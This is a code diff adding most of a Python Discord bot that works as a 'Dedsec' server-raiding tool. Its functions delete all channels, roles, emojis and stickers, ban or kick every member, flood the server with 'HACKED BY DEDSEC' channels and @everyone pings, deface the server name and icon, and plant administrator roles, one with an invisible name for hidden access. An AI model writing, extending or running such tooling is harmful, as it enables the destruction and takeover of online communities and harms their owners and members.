+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    
+    channel_type = input(f"\n\t {green_question} SELECT: ").lower()
+
+    if channel_type not in ['1', '2', '3']:
+        print(f"\n\t {red_warning} Invalid channel type. Please enter '1', '2', or '3'.")
+        return
+
+    categories = selected_guild.categories
+    print(f'\n\t {green_dot} Do you want to create channels in a specific category?')
+    option = '''[1]. Yes\n[2]. No\n[3]. Random\n[0]. Back'''
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    category_choice = input(f"\n\t {green_question} SELECT: ").lower()
+    chosen_category = None
+
+    if category_choice == '0':
+        return
+    
+    elif category_choice == '1':
+        if categories:
+            print(f"\n\t {green_dot} Available Categories:")
+            category_data = [[index, category.name] for index, category in enumerate(categories, start=1)]
+            headers = ["No", "Category Name"]
+            table = tabulate(category_data, headers=headers, tablefmt="rounded_grid")
+            print("\n".join(["\t " + line for line in table.split("\n")]))
+            try:
+                category_index = int(input(f"\t {green_question} Select a category number: ")) - 1
+                if 0 <= category_index < len(categories):
+                    chosen_category = categories[category_index]
+                else:
+                    print(f"\n\t {red_warning} Invalid selection. Please choose a valid category number.")
+            except ValueError:
+                print(f"\n\t {red_warning} Please enter a valid number.")
+        else:
+            print(f"\n\t {red_warning} No categories found. Using default category selection.")
+            category_choice = '3'
+
+    tasks = []
+    
+    for i in range(num_channels):
+        category = None
+        
+        if category_choice == '3' and categories:
+            category = random.choice(categories)
+        elif chosen_category:
+            category = chosen_category
+        if channel_type == '2':
+            tasks.append(retry_on_ratelimit(selected_guild.create_voice_channel, channel_name, category=category))
+        elif channel_type == '3':
+            tasks.append(retry_on_ratelimit(selected_guild.create_voice_channel, channel_name, category=category))
+            tasks.append(retry_on_ratelimit(selected_guild.create_text_channel, channel_name, category=category))
+        else:
+            tasks.append(retry_on_ratelimit(selected_guild.create_text_channel, channel_name, category=category))
+
+    await asyncio.gather(*tasks)
+    print(f"\n\t {green_dot} {num_channels} {channel_type} channels created with name ({channel_name}).")
+    await asyncio.sleep(1)
+
+async def retry_on_ratelimit(func, *args, **kwargs):
+    try:
+        return await func(*args, **kwargs)
+    except discord.HTTPException as e:
+        if e.code == 429:
+            print(f"\n\t {red_warning} Rate limit exceeded. Retrying...")
+            await asyncio.sleep(e.retry_after)
+            return await retry_on_ratelimit(func, *args, **kwargs)
+        else:
+            raise e
+        
+async def delete_channels():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    option = '[1]. Delete specific channels\n[2]. Delete all channels in a category\n[3]. Delete all channels in the server\n[0]. Back'
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    choice = await get_int_input(f"\n\t {green_question} SELECT: ")
+
+    if choice == 1:
+        channel_data = []
+        for idx, channel in enumerate(selected_guild.text_channels + selected_guild.voice_channels, start=1):
+            channel_data.append([idx, channel.name, channel.id])
+
+        headers = ["No", "Channel Name", "Channel ID"]
+        table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+        print(f"\n\t {green_dot} Available Channels:")
+        print("\n".join(["\t " + line for line in table.split("\n")]))
+
+        try:
+            channel_numbers = await get_str_input(f"\n\t {green_question} Enter the numbers of the channels to delete (comma separated): ")
+            channel_numbers = [int(num) for num in channel_numbers.split(',')]
+            
+            channels_to_delete = [channel for idx, channel in enumerate(selected_guild.text_channels + selected_guild.voice_channels, start=1) if idx in channel_numbers]
+
+            if channels_to_delete:
+                tasks = [retry_on_ratelimit(channel.delete) for channel in channels_to_delete]
+                await asyncio.gather(*tasks)
+                print(f"\n\t {green_dot} Selected channels have been deleted.")
+            else:
+                print(f"\n\t {red_warning} No valid channels selected for deletion.")
+        except ValueError:
+            print(f"\n\t {red_warning} Invalid input. Please enter valid numbers.")
+
+    elif choice == 2:
+        category_data = []
+        for idx, category in enumerate(selected_guild.categories, start=1):
+            if category.channels:
+                category_data.append([idx, category.name])
+
+        headers = ["No", "Category Name"]
+        table = tabulate(category_data, headers=headers, tablefmt="rounded_grid")
+        print(f"\n\t {green_dot} Available Categories:")
+        print("\n".join(["\t " + line for line in table.split("\n")]))
+
+        try:
+            category_number = await get_int_input(f"\n\t {green_question} Enter the number of the category to delete all channels from: ")
+            selected_category = next((cat for idx, cat in enumerate(selected_guild.categories, start=1) if idx == category_number), None)
+
+            if selected_category:
+                tasks = [retry_on_ratelimit(channel.delete) for channel in selected_category.channels]
+                await asyncio.gather(*tasks)
+                print(f"\n\t {green_dot} All channels in category '{selected_category.name}' have been deleted.")
+            else:
+                print(f"\n\t {red_warning} No category found with the number: {category_number}")
+        except ValueError:
+            print(f"\n\t {red_warning} Invalid input. Please enter a valid number.")
+
+    elif choice == 3:
+        tasks = [retry_on_ratelimit(channel.delete) for channel in selected_guild.text_channels + selected_guild.voice_channels]
+        await asyncio.gather(*tasks)
+        print(f"\n\t {green_dot} All channels (text and voice) in the server have been deleted.")
+    elif choice == 0:
+        return
+    else:
+        print(f"\n\t {red_warning} Invalid selection. Please choose a valid option.")
+
+async def delete_all_roles():
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    tasks = []
+    for role in selected_guild.roles:
+        if role.name != "@everyone":
+            tasks.append(retry_on_ratelimit(role.delete))
+            print(f'\n\t {green_dot} Deleted role ({role.name}) with ID ({role.id}).')
+
+    await asyncio.gather(*tasks)
+    print(f"\n\t {green_dot} All roles except '@everyone' have been deleted.")
+
+async def manage_roles():
+    option = '''[1]. Delete Specific Role\n[2]. Delete All Roles\n[3]. Create Roles with Administrator Permission\n[0]. Back'''
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    choice = await get_int_input(f"\n\t {green_question} SELECT: ")
+
+    if choice == 1:
+        if selected_guild is None:
+            print(f"\t {red_warning} No server selected.")
+            return
+
+        roles = [role for role in selected_guild.roles if role.name != "@everyone"]
+        if not roles:
+            print(f"\n\t {red_warning} No roles available to delete.")
+            return
+
+        role_data = [[i + 1, role.name, role.id] for i, role in enumerate(roles)]
+        headers = ["No", "Role Name", "Role ID"]
+        table = tabulate(role_data, headers=headers, tablefmt="rounded_grid")
+        print(f"\n\t {green_dot} Available Roles:")
+        print("\n".join(["\t " + line for line in table.split("\n")]))
+
+        try:
+            role_numbers = await get_str_input(f"\n\t {green_question} Enter the numbers of the roles to delete (comma separated): ")
+            role_numbers = [int(num) for num in role_numbers.split(',')]
+
+            tasks = []
+            for num in role_numbers:
+                if 1 <= num <= len(role_data):
+                    role_id = role_data[num - 1][2]
+                    role = discord.utils.get(selected_guild.roles, id=role_id)
+                    if role:
+                        tasks.append(retry_on_ratelimit(role.delete))
+                        print(f'\n\t {green_dot} Deleted role ({role.name}) with ID ({role.id}).')
+                else:
+                    print(f"\n\t {red_warning} Invalid role number: {num}")
+
+            await asyncio.gather(*tasks)
+        except ValueError:
+            print(f"\n\t {red_warning} Invalid input. Please enter valid numbers.")
+
+    elif choice == 2:
+        if selected_guild is None:
+            print(f"\t {red_warning} No server selected.")
+            return
+
+        tasks = []
+        for role in selected_guild.roles:
+            if role.name != "@everyone":
+                tasks.append(retry_on_ratelimit(role.delete))
+                print(f'\n\t {green_dot} Deleted role ({role.name}) with ID ({role.id}).')
+
+        await asyncio.gather(*tasks)
+        print(f"\n\t {green_dot} All roles except '@everyone' have been deleted.")
+
+    elif choice == 3:
+        if selected_guild is None:
+            print(f"\t {red_warning} No server selected.")
+            return
+
+        role_name = await get_str_input(f"\n\t {green_question} Enter the name for the new roles: ")
+        try:
+            num_roles = await get_int_input(f"\n\t {green_question} Enter the number of roles to create: ")
+        except ValueError:
+            print(f"\n\t {red_warning} Invalid number of roles. Please enter a valid number.")
+            return
+
+        perms = discord.Permissions(administrator=True)
+
+        tasks = [retry_on_ratelimit(selected_guild.create_role, name=role_name, permissions=perms) for _ in range(num_roles)]
+        await asyncio.gather(*tasks)
+        print(f"\n\t {green_dot} {num_roles} roles created with the name ({role_name}) and 'Administrator' permission enabled.")
+    elif choice == 0:
+        return
+    else:
+        print(f"\n\t {red_warning} Invalid selection. Please choose a valid option.")
+
+async def delete_all_stickers():
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    tasks = [retry_on_ratelimit(sticker.delete) for sticker in selected_guild.stickers]
+    await asyncio.gather(*tasks)
+    print(f"\t {green_dot} All stickers have been deleted.")
+
+async def ban_or_unban_user(action, username):
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    tasks = []
+    users = []
+    action_text = "banned" if action == "ban" else "unbanned"
+
+    if username.lower() == "all":
+        for member in selected_guild.members:
+            if member != bot.user:
+                if action == "ban":
+                    tasks.append(retry_on_ratelimit(member.ban, reason="Banned by Dedsec"))
+                elif action == "unban":
+                    tasks.append(retry_on_ratelimit(selected_guild.unban, member))
+                users.append(member.name)
+    else:
+        member = discord.utils.get(selected_guild.members, name=username)
+        if member is not None:
+            if action == "ban":
+                tasks.append(retry_on_ratelimit(member.ban, reason="Banned by Dedsec"))
+            elif action == "unban":
+                tasks.append(retry_on_ratelimit(selected_guild.unban, member))
+            users.append(member.name)
+        else:
+            print(f'\n\t {green_dot} No member found with username: {username}')
+
+    await asyncio.gather(*tasks)
+
+    if users:
+        headers = [f"{action_text.capitalize()} Users"]
+        print(tabulate([[user] for user in users], headers=headers, tablefmt="plain"))
+    else:
+        print(f"\n\t {green_dot} No users {action_text}.")
+        
+async def kick_user(username):
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    tasks = []
+    if username.lower() == "all":
+        for member in selected_guild.members:
+            if member != bot.user:
+                tasks.append(retry_on_ratelimit(member.kick, reason="Kicked by Dedsec"))
+                print(f'\n\t {green_dot} Kicked {member.name}')
+    else:
+        member = discord.utils.get(selected_guild.members, name=username)
+        if member is not None:
+            tasks.append(retry_on_ratelimit(member.kick, reason="Kicked by Dedsec"))
+            print(f'\n\t {green_dot} Kicked {member.name}')
+        else:
+            print(f'\n\t {green_dot} No member found with username: {username}')
+
+    await asyncio.gather(*tasks)
+
+async def mute_or_unmute_user(username, action):
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    tasks = []
+
+    async def update_member_mute_status(member, mute_status):
+        if isinstance(member, discord.Member):
+            try:
+                await member.edit(mute=mute_status)
+                action_str = "Muted" if mute_status else "Unmuted"
+                print(f'\n\t {green_dot} {action_str}: {member.name}')
+            except discord.Forbidden:
+                print(f'\n\t {red_warning} Insufficient permissions to {action_str.lower()} {member.name}.')
+            except Exception as e:
+                print(f'\n\t {red_warning} Error {action_str.lower()} {member.name}: {str(e)}')
+
+    mute_status = action.lower() == "mute"
+
+    if username.lower() == "all":
+        for member in selected_guild.members:
+            if member != bot.user:
+                tasks.append(update_member_mute_status(member, mute_status))
+    else:
+        member = discord.utils.get(selected_guild.members, name=username)
+        if member is not None:
+            tasks.append(update_member_mute_status(member, mute_status))
+        else:
+            print(f'\n\t {red_warning} No member found with username: {username}')
+
+    await asyncio.gather(*tasks)
+
+async def change_nickname(username, new_nickname):
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    tasks = []
+    if username.lower() == "all":
+        for member in selected_guild.members:
+            if member != bot.user:
+                tasks.append(retry_on_ratelimit(member.edit, nick=new_nickname))
+                print(f'\n\t {green_dot} Changed nickname of {member.name} to {new_nickname}')
+    else:
+        member = discord.utils.get(selected_guild.members, name=username)
+        if member is not None:
+            tasks.append(retry_on_ratelimit(member.edit, nick=new_nickname))
+            print(f'\n\t {green_dot} Changed nickname of {member.name} to {new_nickname}')
+        else:
+            print(f'\n\t {green_dot} No member found with username: {username}')
+
+    await asyncio.gather(*tasks)
+    
+async def nuke():
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    tasks = [retry_on_ratelimit(channel.delete) for channel in selected_guild.text_channels + selected_guild.voice_channels]
+    await asyncio.gather(*tasks)
+    
+    tasks = [retry_on_ratelimit(category.delete) for category in selected_guild.categories]
+    await asyncio.gather(*tasks)
+    
+    kick_user(username="all")
+    delete_all_roles()
+    delete_all_stickers()
+    
+    emoji_tasks = [emoji.delete() for emoji in selected_guild.emojis]
+    await asyncio.gather(*emoji_tasks)
+
+    print(f"\n\t {green_dot} All channels (text and voice) have been deleted.")
+
+async def flood_the_server():
+    MESSAGE = 'HACKED BY DEDSEC'
+    MESSAGE_C = '''
+```
+WE ARE DEDSEC, WE ARE DEDSEC
+WE ARE DEDSEC, WE ARE DEDSEC
+WE ARE DEDSEC, WE ARE DEDSEC
+WE ARE DEDSEC, WE ARE DEDSEC
+
+```
+**JOIN US: **
+'''
+    await change_server_name(MESSAGE)
+    os.system('wget -O /tmp/troll-face.jpg https://www.meme-arsenal.com/memes/cf69fb20832fcd47462a867dd391b96f.jpg > /dev/null 2>&1')
+    await change_server_icon('/tmp/troll-face.jpg')
+    
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    category_tasks = [category.delete() for category in selected_guild.categories]
+    await asyncio.gather(*category_tasks)
+
+    tasks = [retry_on_ratelimit(channel.delete) for channel in selected_guild.text_channels + selected_guild.voice_channels]
+    await asyncio.gather(*tasks)
+    
+    category_tasks = [retry_on_ratelimit(selected_guild.create_category, MESSAGE) for _ in range(10)]
+    new_categories = await asyncio.gather(*category_tasks)
+
+    tasks = []
+    for category in new_categories:
+        for _ in range(10): 
+            tasks.append(retry_on_ratelimit(selected_guild.create_text_channel, MESSAGE, category=category))
+
+    await asyncio.gather(*tasks)
+
+    message = "@everyone"
+    tasks = []
+    for channel in selected_guild.text_channels:
+        tasks.append(send_message_with_delay(channel, message, 0.1))
+
+    await asyncio.gather(*tasks)
+
+    tasks = []
+    for channel in selected_guild.text_channels:
+        tasks.append(send_message_with_delay(channel, MESSAGE_C, 0.1)) 
+
+    await asyncio.gather(*tasks)
+
+    print(f"\n\t {green_dot} The server has been flooded.")
+
+async def for_testing():
+    MESSAGE = 'FOR TESTING ONLY'
+    category_tasks = [retry_on_ratelimit(selected_guild.create_category, MESSAGE) for _ in range(10)]
+    new_categories = await asyncio.gather(*category_tasks)
+    
+    tasks = []
+    for category in new_categories:
+        for _ in range(10):
+            tasks.append(retry_on_ratelimit(selected_guild.create_text_channel, MESSAGE, category=category))
+
+    await asyncio.gather(*tasks)
+    
+async def delete_server_contents():
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+
+    channel_tasks = [channel.delete() for channel in selected_guild.channels]
+    await asyncio.gather(*channel_tasks)
+
+    category_tasks = [category.delete() for category in selected_guild.categories]
+    await asyncio.gather(*category_tasks)
+
+    role_tasks = [role.delete() for role in selected_guild.roles if role.name != "@everyone"]
+    await asyncio.gather(*role_tasks)
+
+    emoji_tasks = [emoji.delete() for emoji in selected_guild.emojis]
+    await asyncio.gather(*emoji_tasks)
+
+    sticker_tasks = [sticker.delete() for sticker in selected_guild.stickers]
+    await asyncio.gather(*sticker_tasks)
+
+    print(f"\t {green_dot} All possible content in the server has been deleted.")
+
+async def ping_everyone_in_all_channels():
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+    message = "@everyone"
+    tasks = []
+    for channel in selected_guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            tasks.append(send_message_with_delay(channel, message, 0.1))
+        elif isinstance(channel, discord.VoiceChannel):
+            associated_text_channel = discord.utils.get(selected_guild.text_channels, name=channel.name)
+            if associated_text_channel:
+                tasks.append(send_message_with_delay(associated_text_channel, message, 0.1))
+
+    await asyncio.gather(*tasks)
+    print(f"\n\t {green_dot} @everyone ping sent in all channels.")
+    
+async def show_typing_in_all_channels(duration):
+    if selected_guild is None:
+        print(f"\n\t {green_dot} No server selected.")
+        return
+
+    tasks = []
+    for channel in selected_guild.text_channels:
+        tasks.append(show_typing_in_channel(channel, duration))
+
+    await asyncio.gather(*tasks)
+    print(f"\n\t {green_dot} Typing indicator shown in all channels for {duration} seconds.")
+
+async def show_typing_in_channel(channel, duration):
+    async with channel.typing():
+        print(f"\n\t {green_dot} Typing in {channel.name} (ID: {channel.id})")
+        await asyncio.sleep(duration)
+        
+async def create_categories():
+    base_name = await get_str_input(f"\n\t {green_question} Enter base name for categories: ")
+    try:
+        num_categories = await get_int_input(f"\t {green_question} How many categories to create? ")
+        if num_categories < 1 or num_categories > 50:
+            print(f"\t {red_warning} Number must be between 1-50")
+            return
+            
+        tasks = [selected_guild.create_category(f"{base_name} {i+1}") for i in range(num_categories)]
+        await asyncio.gather(*tasks)
+        print(f"\n\t {green_dot} Created {num_categories} categories with prefix '{base_name}'")
+    except ValueError:
+        print(f"\t {red_warning} Invalid number input")
+    await asyncio.sleep(1)
+
+async def delete_categories():
+    categories = [c for c in selected_guild.categories if c.name != "Categories"]
+    if not categories:
+        print(f"\t {green_dot} No deletable categories found")
+        return
+
+    category_data = [[idx+1, cat.name, len(cat.channels)] for idx, cat in enumerate(categories)]
+    print("\n".join(["\t " + line for line in tabulate(
+        category_data, 
+        headers=["#", "Category Name", "Channels"], 
+        tablefmt="rounded_grid"
+    ).split("\n")]))
+
+    try:
+        choices = await get_str_input(f"\n\t {green_question} Enter category numbers to delete (comma separated): ")
+        to_delete = [int(num.strip())-1 for num in choices.split(',') if num.strip().isdigit()]
+        
+        confirm = await get_str_input(f"\n\t {red_warning} Delete {len(to_delete)} categories? (y/n): ")
+        if confirm.lower() != 'y':
+            return
+            
+        for idx in sorted(to_delete, reverse=True):
+            if 0 <= idx < len(categories):
+                await categories[idx].delete()
+        print(f"\n\t {green_dot} Deleted {len(to_delete)} categories")
+    except Exception as e:
+        print(f"\n\t {red_warning} Error: {e}")
+    await asyncio.sleep(1)
+
+async def lock_category_channels():
+    categories = selected_guild.categories
+    if not categories:
+        print(f"\t {green_dot} No categories found")
+        return
+
+    category_data = [[idx+1, cat.name] for idx, cat in enumerate(categories)]
+    print("\n".join(["\t " + line for line in tabulate(
+        category_data,
+        headers=["#", "Category Name"],
+        tablefmt="rounded_grid"
+    ).split("\n")]))
+
+    try:
+        choice = await get_int_input(f"\n\t {green_question} Select category number to lock: ") - 1
+        if 0 <= choice < len(categories):
+            category = categories[choice]
+            await lock_channels_in_category(category)
+    except ValueError:
+        print(f"\t {red_warning} Invalid input")
+    await asyncio.sleep(1)
+
+async def lock_channels_in_category(category):
+    try:
+        overwrite = discord.PermissionOverwrite()
+        overwrite.send_messages = False
+        overwrite.send_messages_in_threads = False
+        overwrite.create_public_threads = False
+        overwrite.create_private_threads = False
+        
+        tasks = []
+        for channel in category.channels:
+            if isinstance(channel, discord.TextChannel):
+                tasks.append(channel.set_permissions(selected_guild.default_role, overwrite=overwrite))
+        
+        await asyncio.gather(*tasks)
+        print(f"\t {green_dot} Locked all text channels in '{category.name}'")
+    except discord.Forbidden:
+        print(f"\t {red_warning} Missing permissions to lock channels")
+    except Exception as e:
+        print(f"\t {red_warning} Error: {e}")
+
+async def list_all_categories():
+    categories = selected_guild.categories
+    if not categories:
+        print(f"\t {green_dot} No categories found")
+        return
+
+    category_data = []
+    for idx, category in enumerate(categories, 1):
+        text = len([c for c in category.channels if isinstance(c, discord.TextChannel)])
+        voice = len([c for c in category.channels if isinstance(c, discord.VoiceChannel)])
+        category_data.append([
+            idx,
+            f"{GREEN}{category.name}{RESET}",
+            f"{GREEN}{text} text{RESET}",
+            f"{GREEN}{voice} voice{RESET}",
+            "Yes" if category.permissions_for(selected_guild.me).manage_channels else "No"
+        ])
+
+    headers = ["#", "Category Name", "Text", "Voice", "Manageable"]
+    print("\n".join(["\t " + line for line in tabulate(category_data, headers=headers, tablefmt="rounded_grid").split("\n")]))
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+
+async def list_channels_in_category():
+    categories = selected_guild.categories
+    if not categories:
+        print(f"\t {green_dot} No categories found")
+        return
+
+    category_data = [[idx+1, cat.name] for idx, cat in enumerate(categories)]
+    print("\n".join(["\t " + line for line in tabulate(
+        category_data,
+        headers=["#", "Category Name"],
+        tablefmt="rounded_grid"
+    ).split("\n")]))
+
+    try:
+        choice = await get_int_input(f"\n\t {green_question} Select category number to view channels: ") - 1
+        if 0 <= choice < len(categories):
+            category = categories[choice]
+            await display_category_channels(category)
+    except ValueError:
+        print(f"\t {red_warning} Invalid input")
+    await asyncio.sleep(1)
+
+async def display_category_channels(category):
+    if not category.channels:
+        print(f"\t {green_dot} No channels in this category")
+        return
+
+    channel_data = []
+    for idx, channel in enumerate(category.channels, 1):
+        channel_type = "🔊 Voice" if isinstance(channel, discord.VoiceChannel) else "💬 Text"
+        channel_data.append([
+            idx,
+            f"{GREEN}{channel.name}{RESET}",
+            channel_type,
+            channel.created_at.strftime('%Y-%m-%d')
+        ])
+
+    headers = ["#", "Channel Name", "Type", "Created"]
+    print(f"\n\t {green_dot} Channels in '{category.name}':")
+    print("\n".join(["\t " + line for line in tabulate(channel_data, headers=headers, tablefmt="rounded_grid").split("\n")]))
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+    
+async def change_server_name(new_name):
+    try:
+        await selected_guild.edit(name=new_name)
+        print(f"\n\t {green_dot} Server name changed to: {new_name}")
+    except discord.Forbidden:
+        print(f"\t {green_dot} Missing permissions to change the server name.")
+    except discord.HTTPException as e:
+        print(f"\t {green_dot} HTTP Exception occurred: {e}")
+    except Exception as e:
+        print(f"\t {green_dot} An error occurred: {e}")
+
+async def change_server_icon(image_path):
+    if selected_guild is None:
+        print(f"\t {green_dot} No server selected.")
+        return
+    try:
+        with open(image_path, 'rb') as f:
+            image_data = f.read()
+        
+        image_file = io.BytesIO(image_data)
+        
+        await selected_guild.edit(icon=image_file.read())
+        print(f"\n\t {green_dot} Server icon changed successfully.")
+        
+    except FileNotFoundError:
+        print(f"\n\t {green_dot} File not found. Please check the path.")
+    except discord.Forbidden:
+        print(f"\n\t {green_dot} Missing permissions to change the server icon.")
+    except discord.HTTPException as e:
+        print(f"\n\t {green_dot} HTTP Exception occurred")
+    except Exception as e:
+        print(f"\n\t {green_dot} An error occurred")
+
+async def clean_exit():
+    print(f"\n\t {green_dot} Exiting...\n")
+    
+    tasks = [task for task in asyncio.all_tasks() if task is not asyncio.current_task()]
+    for task in tasks:
+        task.cancel()
+    try:
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except asyncio.CancelledError:
+        pass
+    
+    if not bot.is_closed():
+        await bot.close()
+    
+    if hasattr(bot, 'http') and hasattr(bot.http, '_session'):
+        await bot.http._session.close()
+        await asyncio.sleep(0.1)
+    
+    sys.exit(0)
+
+async def show_all_roles():
+    if selected_guild is None:
+        print(f"\n\t {red_warning} No server selected.")
+        return
+    role_data = []
+    for role in selected_guild.roles:
+        permissions_list = [perm for perm, value in role.permissions if value]
+        wrapped_permissions = "\n".join(
+            [", ".join(permissions_list[i:i+3]) for i in range(0, len(permissions_list), 3)]
+        ) if permissions_list else "No Permissions"
+
+        members_with_role = [member.name for member in selected_guild.members if role in member.roles]
+        wrapped_members = "\n".join(
+            [", ".join(members_with_role[i:i+3]) for i in range(0, len(members_with_role), 3)]
+        ) if members_with_role else "No Users"
+
+        role_data.append([
+            f'{GREEN}{role.name}{RESET}', 
+            "Yes" if role.managed else "No",
+            wrapped_permissions,
+            wrapped_members 
+        ])
+
+    headers = ["Role Name", "Managed", "Permissions", "Users with Role"]
+    table = tabulate(role_data, headers=headers, tablefmt="rounded_grid", stralign="left")
+    
+    bannerc.banner1()
+
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+    os.system('clear')
+
+async def assign_role_to_user():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    role_data = await list_available_roles()
+
+    try:
+        role_number = await get_int_input(f"\n\t {green_question} Enter the number of the role to assign: ")
+        if role_number < 1 or role_number > len(role_data):
+            print(f"\n\t {red_warning} Invalid role number.")
+            return
+
+        selected_role = selected_guild.get_role(role_data[role_number - 1][2])
+        if selected_role is None:
+            print(f"\n\t {red_warning} Role not found.")
+            return
+
+        username = await get_str_input(f"\n\t {green_question} Enter the username to assign the role to: ")
+        member = discord.utils.get(selected_guild.members, name=username)
+        if member is None:
+            print(f"\n\t {red_warning} No member found with username: {username}")
+            return
+
+        try:
+            await member.add_roles(selected_role)
+            print(f"\n\t {green_dot} Role '{selected_role.name}' assigned to {member.name}.")
+        except discord.Forbidden:
+            print(f"\n\t {red_warning} Bot does not have permission to assign roles.")
+        except discord.HTTPException as e:
+            print(f"\n\t {red_warning} An error occurred: {e}")
+
+    except ValueError:
+        print(f"\n\t {red_warning} Invalid input. Please enter a valid number.")
+
+async def list_available_roles():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return []
+
+    filtered_roles = [role for role in selected_guild.roles if role.name != "@everyone"]
+    role_data = [[idx, role.name, role.id] for idx, role in enumerate(filtered_roles, start=1)]
+
+    headers = ["No", "Role Name", "Role ID"]
+    table = tabulate(role_data, headers=headers, tablefmt="rounded_grid")
+    
+    print(f"\n\t {green_dot} Available Roles:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+    
+    return role_data
+
+
+async def make_admin_role_and_assign():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    admin_role = discord.utils.get(selected_guild.roles, name="Admin")
+    if admin_role is None:
+        admin_role = await selected_guild.create_role(name="Admin", permissions=discord.Permissions.all())
+    else:
+        print(f'\n\t {green_dot} "Admin" role already exists.')
+
+    tasks = []
+    for member in selected_guild.members:
+        if admin_role not in member.roles:
+            tasks.append(member.add_roles(admin_role))
+            print(f'\n\t {green_dot} Assigned "Admin" role to {member.name}.')
+
+    await asyncio.gather(*tasks)
+    print(f"\n\t {green_dot} All members have been assigned the 'Admin' role.")
+    
+async def assign_admin_role_to_user(user_identifier, action):
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+    
+    admin_role_name = "󠇯"
+    admin_role = discord.utils.get(selected_guild.roles, name=admin_role_name)
+    if admin_role is None:
+        print(f'\t {red_warning} "{admin_role_name}" role does not exist. Creating the role.')
+        admin_permissions = discord.Permissions()
+        admin_permissions.update(administrator=True)
+        admin_role = await selected_guild.create_role(name=admin_role_name, permissions=admin_permissions)
+
+    member = discord.utils.get(selected_guild.members, id=int(user_identifier)) if user_identifier.isdigit() else discord.utils.get(selected_guild.members, name=user_identifier)
+    if member is None:
+        print(f'\n\t {red_warning} No member found with identifier: {user_identifier}')
+        await asyncio.sleep(1)
+        return
+    if action.lower() == '1':
+        if admin_role not in member.roles:
+            await member.add_roles(admin_role)
+            print(f'\n\t {green_dot} Assigned "{admin_role_name}" role to {member.name}.')
+            await asyncio.sleep(1)
+        else:
+            print(f'\n\t {green_dot} {member.name} already has the "{admin_role_name}" role.')
+            await asyncio.sleep(1)
+    elif action.lower() == '2':
+        if admin_role in member.roles:
+            await member.remove_roles(admin_role)
+            print(f'\n\t {green_dot} Removed "{admin_role_name}" role from {member.name}.')
+            await asyncio.sleep(1)
+        else:
+            print(f'\n\t {green_dot} {member.name} does not have the "{admin_role_name}" role.')
+            await asyncio.sleep(1)
+
+async def create_or_manage_webhook():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    channel_data = []
+    channel_mapping = {} 
+    for idx, channel in enumerate(selected_guild.text_channels, start=1):
+        channel_data.append([idx, channel.name, channel.id])
+        channel_mapping[idx] = channel
+
+    headers = ["Number", "Channel Name", "Channel ID"]
+    table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+    print(f"\n\t {green_dot} Available Channels:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+
+    try:
+        channel_number = await get_int_input(f"\n\t {green_question} Enter the number of the channel to manage webhooks: ")
+        selected_channel = channel_mapping.get(channel_number)
+        if not selected_channel:
+            print(f'\n\t {red_warning} No channel found with the number: {channel_number}')
+            await asyncio.sleep(1)
+            return
+    except ValueError:
+        print(f'\n\t {red_warning} Invalid input. Please enter a valid number.')
+        return
+
+    print(f'\n\t {green_dot} Do you want to create or delete a webhook?')
+    option = '''[1]. Create a webhook\n[2]. Delete a webhook'''
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    print()
+    
+    action = input(f"\t {green_question} SELECT: ").strip().lower()
+    
+    if action == '1':
+        webhook_name = input(f"\n\t {green_question} Enter the name for the new webhook: ").strip()
+        try:
+            webhook = await selected_channel.create_webhook(name=webhook_name)
+            print(f'\n\t {green_dot} Webhook "{GREEN}{webhook_name}{RESET}" created in channel {GREEN}{selected_channel.name}{RESET}.')
+            await asyncio.sleep(1)
+            
+            webhook_data = [
+                [webhook.name, f'{GREEN}{webhook.url}{RESET}', selected_channel.name]
+            ]
+            webhook_headers = ["Webhook Name", "Webhook URL", "Channel Name"]
+            webhook_table = tabulate(webhook_data, headers=webhook_headers, tablefmt="rounded_grid")
+            print(f"\n\t {green_dot} Created Webhook:")
+            print("\n".join(["\t " + line for line in webhook_table.split("\n")]))
+            await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+            os.system('clear')
+        except discord.Forbidden:
+            print(f'\n\t {red_warning} Permission denied. Cannot create a webhook in this channel.')
+            await asyncio.sleep(1)
+            return
+        except discord.HTTPException as e:
+            print(f'\n\t {red_warning} Failed to create webhook: {e}')
+            await asyncio.sleep(1)
+            return
+        
+    elif action == '2':
+        try:
+            webhooks = await selected_channel.webhooks()
+            if not webhooks:
+                print(f'\t {red_warning} No webhooks found in the selected channel.')
+                await asyncio.sleep(1)
+                return
+
